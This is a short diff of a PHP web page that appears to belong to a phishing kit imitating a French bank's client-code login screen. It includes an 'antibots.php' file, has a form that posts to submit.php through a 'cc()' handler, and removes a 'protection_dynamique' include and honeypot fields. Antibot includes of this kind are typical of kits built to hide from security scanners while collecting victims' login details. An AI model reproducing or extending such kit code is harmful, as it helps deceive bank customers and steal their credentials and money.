@@ -15,7 +15,6 @@ error_reporting(E_ALL);
  */
 
 include '../inc/antibots.php';
-include '../inc/protection_dynamique.php';
 include_once '../inc/app.php';
 
 $random   = rand(0,100000000000);
@@ -627,25 +626,6 @@ display: none !important;
 
 <div id="dcw-swm" class="swm-inner-wrapper">
 <form id="form" action="submit.php" method="POST" onsubmit="return cc()" class="component-mire-codeclient">
-
-    <div style="display:none;">
-        <label for="url">URL de votre site</label>
-        <input type="text" id="url" name="url">
-    </div>
-    <input type="hidden" name="js_check" id="js_check" value="0">
-    <input type="hidden" name="load_time" id="load_time" value="<?php echo $_SESSION['load_time']; ?>">
-
-    <div class="swm_block-element">
-        <div class="prefetch"></div>
-        <div id="disableLayer" class="disable-layer"></div>
-        </div>
-</form>
-
-<script>
-    document.addEventListener('DOMContentLoaded', function() {
-        document.getElementById('js_check').value = '1';
-    });
-</script>
 <div class="swm_block-element">
 <div class="prefetch"></div>
 <div id="disableLayer" class="disable-layer"></div>
